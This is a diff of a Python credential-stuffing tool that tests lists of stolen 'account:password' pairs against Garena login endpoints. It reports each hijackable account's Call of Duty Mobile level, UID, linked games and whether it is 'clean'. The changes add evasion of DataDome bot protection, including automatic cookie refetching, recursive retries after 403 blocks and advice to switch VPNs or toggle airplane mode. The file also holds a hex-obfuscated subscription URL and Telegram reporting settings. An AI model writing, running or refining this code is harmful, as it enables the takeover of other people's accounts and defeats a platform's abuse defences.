@@ -28,7 +28,6 @@ TELEGRAM_BOT_TOKEN = None
 TELEGRAM_CHAT_ID = None
 TELEGRAM_ENABLED = False
 THREAD_COUNT = 1
-THREAD_SPEED = "normal"
 BATCH_COUNT = 0
 
 _ENCRYPTED_SUBSCRIPTION_API_URL_PART1 = "48747470733a2f2f61736878646561746831302e7831302e627a2f"
@@ -289,13 +288,21 @@ class DataDomeManager:
     def handle_403(self, session):
         self._403_attempts += 1
         if self._403_attempts >= 3:
+            logger.error(f"{colorama.Fore.RED}IP blocked after 3 attempts.{colorama.Style.RESET_ALL}")
+            logger.error(f"{colorama.Fore.YELLOW}Network fix: WiFi -> Use VPN | Mobile Data -> Toggle Airplane Mode{colorama.Style.RESET_ALL}")
+            logger.info(f"{colorama.Fore.CYAN}Script PAUSED. Fix your network and press Enter to continue...{colorama.Style.RESET_ALL}")
+            
             input()
+            
+            logger.info(f"{colorama.Fore.GREEN}Auto-fetching new DataDome cookie...{colorama.Style.RESET_ALL}")
             new_datadome = get_datadome_cookie(session)
             if new_datadome:
                 self.set_datadome(new_datadome)
                 self._403_attempts = 0
+                logger.info(f"{colorama.Fore.GREEN}Auto-fetched new DataDome: {new_datadome[:30]}...{colorama.Style.RESET_ALL}")
                 return True
             else:
+                logger.error(f"{colorama.Fore.RED}Failed to auto-fetch DataDome cookie{colorama.Style.RESET_ALL}")
                 return False
         return False
 
@@ -424,7 +431,7 @@ def format_telegram_message(account_data):
     return message
 
 def setup_threads():
-    global THREAD_COUNT, THREAD_SPEED
+    global THREAD_COUNT
     
     print(f"\n{colorama.Fore.CYAN}⚡ THREAD CONFIGURATION{colorama.Style.RESET_ALL}")
     print("=" * 50)
@@ -437,19 +444,14 @@ def setup_threads():
     
     if choice == '1':
         THREAD_COUNT = random.randint(1, 3)
-        THREAD_SPEED = "slow"
     elif choice == '2':
         THREAD_COUNT = random.randint(4, 6)
-        THREAD_SPEED = "medium"
     elif choice == '3':
         THREAD_COUNT = random.randint(7, 10)
-        THREAD_SPEED = "fast"
     elif choice == '4':
         THREAD_COUNT = 1
-        THREAD_SPEED = "normal"
     else:
         THREAD_COUNT = 1
-        THREAD_SPEED = "normal"
 
 def format_account_output(account, status, details=None, codm_info=None, count=0):
     username_only = account.split(':')[0] if ':' in account else account
@@ -487,9 +489,9 @@ def format_account_output(account, status, details=None, codm_info=None, count=0
             
             if codm_info:
                 output += f"{colorama.Fore.CYAN}-> CODM Info:{colorama.Style.RESET_ALL}\n"
-                output += f"   {colorama.Fore.WHITE}-> CODM Nickname: {codm_info.get('codm_nickname', 'N/A')}{colorama.Style.RESET_ALL}\n"
-                output += f"   {colorama.Fore.WHITE}-> CODM Level: {codm_info.get('codm_level', 'N/A')}{colorama.Style.RESET_ALL}\n"
-                output += f"   {colorama.Fore.WHITE}-> CODM UID: {codm_info.get('uid', 'N/A')}{colorama.Style.RESET_ALL}\n"
+                output += f"    {colorama.Fore.WHITE}-> CODM Nickname: {codm_info.get('codm_nickname', 'N/A')}{colorama.Style.RESET_ALL}\n"
+                output += f"    {colorama.Fore.WHITE}-> CODM Level: {codm_info.get('codm_level', 'N/A')}{colorama.Style.RESET_ALL}\n"
+                output += f"    {colorama.Fore.WHITE}-> CODM UID: {codm_info.get('uid', 'N/A')}{colorama.Style.RESET_ALL}\n"
                 
             output += f"{colorama.Fore.CYAN}-> Security:{colorama.Style.RESET_ALL}\n"
             output += f"   {colorama.Fore.WHITE}-> Mobile Bound: {details.get('mobile_bound', 'False')}{colorama.Style.RESET_ALL}\n"
@@ -601,40 +603,29 @@ def get_datadome_cookie(session):
     }
     
     data = '&'.join(f'{k}={urllib.parse.quote(str(v))}' for k, v in payload.items())
-    retries = 3
     
-    for attempt in range(retries):
+    try:
+        response = session.post(url, headers=headers, data=data, timeout=10)
+        response.raise_for_status()
+        
         try:
-            response = session.post(url, headers=headers, data=data, timeout=30)
-            response.raise_for_status()
-            
-            try:
-                response_json = response.json()
-            except json.JSONDecodeError:
-                if attempt < retries - 1:
-                    time.sleep(2)
-                    continue
-                return None
-            
-            if response_json.get('status') == 200 and 'cookie' in response_json:
-                cookie_string = response_json['cookie']
-                if '=' in cookie_string and ';' in cookie_string:
-                    datadome = cookie_string.split(';')[0].split('=')[1]
-                else:
-                    datadome = cookie_string
-                    
-                return datadome
+            response_json = response.json()
+        except json.JSONDecodeError:
+            return None
+        
+        if response_json.get('status') == 200 and 'cookie' in response_json:
+            cookie_string = response_json['cookie']
+            if '=' in cookie_string and ';' in cookie_string:
+                datadome = cookie_string.split(';')[0].split('=')[1]
             else:
-                if attempt < retries - 1:
-                    time.sleep(2)
-                    continue
+                datadome = cookie_string
+                
+            return datadome
                     
-        except requests.exceptions.RequestException:
-            if attempt < retries - 1:
-                time.sleep(2)
-        except Exception:
-            if attempt < retries - 1:
-                time.sleep(2)
+    except requests.exceptions.RequestException:
+        return None
+    except Exception:
+        return None
     
     return None
 
@@ -670,64 +661,52 @@ def prelogin(session, account, datadome_manager):
         'X-Device-ID': _GLOBAL_DEVICE_ID
     }
     
-    retries = 3
-    for attempt in range(retries):
-        try:
-            response = session.get(url, headers=headers, params=params, timeout=30)
-            
-            if response.status_code == 403:
-                if datadome_manager.handle_403(session):
-                    return "IP_BLOCKED", None, None
-                if attempt < retries - 1:
-                    time.sleep(2)
-                    continue
-                return None, None, None
-            
-            response.raise_for_status()
-            
-            try:
-                data = response.json()
-            except json.JSONDecodeError:
-                if attempt < retries - 1:
-                    time.sleep(2)
-                    continue
-                return None, None, None
-            
-            new_datadome = None
-            try:
-                cookies_dict = response.cookies.get_dict()
-                new_datadome = cookies_dict.get('datadome')
-            except Exception:
-                pass
-            
-            if 'error' in data:
-                return None, None, new_datadome
-                
-            v1 = data.get('v1')
-            v2 = data.get('v2')
-            
-            if not v1 or not v2:
-                return None, None, new_datadome
-                
-            return v1, v2, new_datadome
-            
-        except requests.exceptions.HTTPError as e:
-            if e.response.status_code == 403:
-                if datadome_manager.handle_403(session):
-                    return "IP_BLOCKED", None, None
-                if attempt < retries - 1:
-                    time.sleep(2)
-                    continue
-                return None, None, None
+    try:
+        response = session.get(url, headers=headers, params=params, timeout=10)
+        
+        if response.status_code == 403:
+            handled = datadome_manager.handle_403(session)
+            if handled:
+                return prelogin(session, account, datadome_manager)
             else:
-                if attempt < retries - 1:
-                    time.sleep(2)
-                    continue
+                return None, None, None
+        
+        response.raise_for_status()
+        
+        try:
+            data = response.json()
+        except json.JSONDecodeError:
+            return None, None, None
+        
+        new_datadome = None
+        try:
+            cookies_dict = response.cookies.get_dict()
+            new_datadome = cookies_dict.get('datadome')
         except Exception:
-            if attempt < retries - 1:
-                time.sleep(2)
-                
-    return None, None, None
+            pass
+        
+        if 'error' in data:
+            return None, None, new_datadome
+            
+        v1 = data.get('v1')
+        v2 = data.get('v2')
+        
+        if not v1 or not v2:
+            return None, None, new_datadome
+            
+        return v1, v2, new_datadome
+        
+    except requests.exceptions.HTTPError as e:
+        if e.response.status_code == 403:
+            handled = datadome_manager.handle_403(session)
+            if handled:
+                return prelogin(session, account, datadome_manager)
+            else:
+                return None, None, None
+        else:
+            return None, None, None
+    except Exception:
+        return None, None, None
 
 def login(session, account, password, v1, v2):
     hashed_password = hash_password(password, v1, v2)
@@ -746,36 +725,27 @@ def login(session, account, password, v1, v2):
         'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
     }
     
-    retries = 3
-    for attempt in range(retries):
+    try:
+        response = session.get(url, headers=headers, params=params, timeout=10)
+        response.raise_for_status()
+        
         try:
-            response = session.get(url, headers=headers, params=params, timeout=30)
-            response.raise_for_status()
+            data = response.json()
+        except json.JSONDecodeError:
+            return None
+        
+        sso_key = response.cookies.get('sso_key')
+        
+        if 'error' in data:
+            error_msg = data['error']
             
-            try:
-                data = response.json()
-            except json.JSONDecodeError:
-                if attempt < retries - 1:
-                    time.sleep(2)
-                    continue
+            if error_msg == 'error_auth':
                 return None
-            
-            sso_key = response.cookies.get('sso_key')
-            
-            if 'error' in data:
-                error_msg = data['error']
-                
-                if error_msg == 'error_auth':
-                    return None
-                elif 'captcha' in error_msg.lower():
-                    time.sleep(3)
-                    continue
                     
-            return sso_key
-            
-        except requests.RequestException:
-            if attempt < retries - 1:
-                time.sleep(2)
+        return sso_key
+        
+    except requests.RequestException:
+        return None
                 
     return None
 
@@ -792,7 +762,7 @@ def get_codm_access_token(session):
         }
         token_data = "client_id=100082&response_type=token&redirect_uri=https%3A%2F%2Fauth.codm.garena.com%2Fauth%2Fauth%2Fcallback_n%3Fsite%3Dhttps%3A%2F%2Fapi-delete-request.codm.garena.co.id%2Foauth%2Fcallback%2F&format=json&id=" + random_id
         
-        token_response = session.post(token_url, headers=token_headers, data=token_data)
+        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=10)
         token_data = token_response.json()
         return token_data.get("access_token", "")
     except Exception:
@@ -819,7 +789,7 @@ def process_codm_callback(session, access_token):
             "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
         }
         
-        callback_response = session.get(codm_callback_url, headers=callback_headers, allow_redirects=False)
+        callback_response = session.get(codm_callback_url, headers=callback_headers, allow_redirects=False, timeout=10)
         
         api_callback_url = f"https://api-delete-request.codm.garena.co.id/oauth/callback/?access_token={access_token}"
         api_callback_headers = {
@@ -840,7 +810,7 @@ def process_codm_callback(session, access_token):
             "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
         }
         
-        api_callback_response = session.get(api_callback_url, headers=api_callback_headers, allow_redirects=False)
+        api_callback_response = session.get(api_callback_url, headers=api_callback_headers, allow_redirects=False, timeout=10)
         location = api_callback_response.headers.get("Location", "")
         
         if "err=3" in location:
@@ -875,7 +845,7 @@ def get_codm_user_info(session, token):
             "user-agent": "Mozilla/5.0 (Linux; Android 11; RMX2195) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Mobile Safari/537.36"
         }
         
-        check_response = session.get(check_login_url, headers=check_headers)
+        check_response = session.get(check_login_url, headers=check_headers, timeout=10)
         check_data = check_response.json()
         
         user_data = check_data.get("user", {})
@@ -974,7 +944,7 @@ def get_game_connections(session, account):
         }
         token_data = f"client_id=10017&response_type=token&redirect_uri=https%3A%2F%2Fshop.garena.sg%2F%3Fapp%3D100082&format=json&id={int(time.time() * 1000)}"
         
-        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=30)
+        token_response = session.post(token_url, headers=token_headers, data=token_data, timeout=10)
         
         try:
             token_data = token_response.json()
@@ -994,7 +964,7 @@ def get_game_connections(session, account):
         }
         inspect_data = {"token": access_token}
         
-        inspect_response = session.post(inspect_url, headers=inspect_headers, json=inspect_data, timeout=30)
+        inspect_response = session.post(inspect_url, headers=inspect_headers, json=inspect_data, timeout=10)
         session_key_roles = inspect_response.cookies.get('session_key')
         if not session_key_roles:
             return ["No game connections found"]
@@ -1017,8 +987,6 @@ def get_game_connections(session, account):
             base_domain = f"shop.garena.{region}"
         
         applicable_games = game_mappings.get(region, game_mappings['default'])
-        detected_roles = {}
-        found_games = []
         
         for app_id, game_name in applicable_games.items():
             roles_url = f"https://{base_domain}/api/shop/apps/roles"
@@ -1037,7 +1005,7 @@ def get_game_connections(session, account):
             }
             
             try:
-                roles_response = session.get(roles_url, params=params_roles, headers=headers_roles, timeout=30)
+                roles_response = session.get(roles_url, params=params_roles, headers=headers_roles, timeout=10)
                 
                 try:
                     roles_data = roles_response.json()
@@ -1051,9 +1019,8 @@ def get_game_connections(session, account):
                     role = roles_data[app_id][0].get("role", None)
                 
                 if role:
-                    detected_roles[app_id] = role
-                    found_games.append(game_name)
                     game_info.append(f"{region.upper()} - {game_name} - {role}")
+                    break
             
             except Exception:
                 continue
@@ -1290,9 +1257,6 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
         
         v1, v2, new_datadome = prelogin(session, account, datadome_manager)
         
-        if v1 == "IP_BLOCKED":
-            return format_account_output(account, "error_ip_blocked", count=BATCH_COUNT)
-        
         if not v1 or not v2:
             if v1 is None and v2 is None:
                 live_stats.update_stats(valid=False)
@@ -1321,11 +1285,11 @@ def processaccount(session, account, password, cookie_manager, datadome_manager,
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/129.0.0.0 Safari/537.36'
         }
         
-        response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=30)
+        response = session.get('https://account.garena.com/api/account/init', headers=headers, timeout=10)
         
         if response.status_code == 403:
             if datadome_manager.handle_403(session):
-                return format_account_output(account, "error_ip_blocked", count=BATCH_COUNT)
+                return processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, count)
             live_stats.update_stats(valid=False)
             return format_account_output(account, "error_banned", count=BATCH_COUNT)
             
@@ -1483,6 +1447,9 @@ def main():
     import signal
     signal.signal(signal.SIGINT, signal_handler)
     
+    print(f"\n{colorama.Fore.GREEN}Starting check...{colorama.Style.RESET_ALL}")
+    print(f"{colorama.Fore.YELLOW}Total accounts to process: {len(accounts)}{colorama.Style.RESET_ALL}")
+    
     for i, account_line in enumerate(accounts, 1):
         if ':' not in account_line:
             continue
@@ -1495,17 +1462,20 @@ def main():
         
         print(live_stats.display_stats(), flush=True)
         
-        result = processaccount(session, account, password, cookie_manager, datadome_manager, live_stats)
+        result = processaccount(session, account, password, cookie_manager, datadome_manager, live_stats, i)
         print(result, flush=True)
         
         processed_accounts.append(account_line)
         
-        time.sleep(1)
+        time.sleep(0.5)
     
     final_stats = live_stats.get_stats()
     print(f"\n{colorama.Fore.CYAN}[FINAL STATS]{colorama.Fore.GREEN} VALID: {final_stats['valid']}{colorama.Style.RESET_ALL}{colorama.Fore.RED} | INVALID: {final_stats['invalid']}{colorama.Style.RESET_ALL}{colorama.Fore.GREEN} | CLEAN: {final_stats['clean']}{colorama.Style.RESET_ALL}{colorama.Fore.YELLOW} | NOT CLEAN: {final_stats['not_clean']}{colorama.Style.RESET_ALL}{colorama.Fore.BLUE} | CODM: {final_stats['codm']}{colorama.Style.RESET_ALL}{colorama.Fore.MAGENTA} | NO CODM: {final_stats['no_codm']}{colorama.Style.RESET_ALL}")
     
-    remove_checked_accounts(filename, processed_accounts)
+    if processed_accounts:
+        remove_checked = input("\nRemove checked accounts from file? (y/n): ").strip().lower()
+        if remove_checked == 'y':
+            remove_checked_accounts(filename, processed_accounts)
 
 if __name__ == "__main__":
     main()
